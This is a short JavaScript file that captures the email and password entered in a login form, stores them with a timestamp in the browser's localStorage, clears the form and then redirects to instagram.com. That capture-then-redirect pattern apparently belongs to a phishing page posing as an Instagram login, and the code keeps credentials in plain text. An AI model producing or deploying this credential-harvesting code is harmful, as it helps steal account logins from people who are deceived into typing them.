// Initialize data storage
let loginData = JSON.parse(localStorage.getItem('loginData')) || [];

// Function to save data
function saveData(email, password) {
    const timestamp = new Date().toLocaleString();
    const entry = { email, password, timestamp };
    loginData.push(entry);

    // Save to localStorage
    localStorage.setItem('loginData', JSON.stringify(loginData));
}

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Save the data
    saveData(email, password);

    // Clear the form
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';

    // Redirect to Instagram
    window.location.href = 'https://www.instagram.com';
});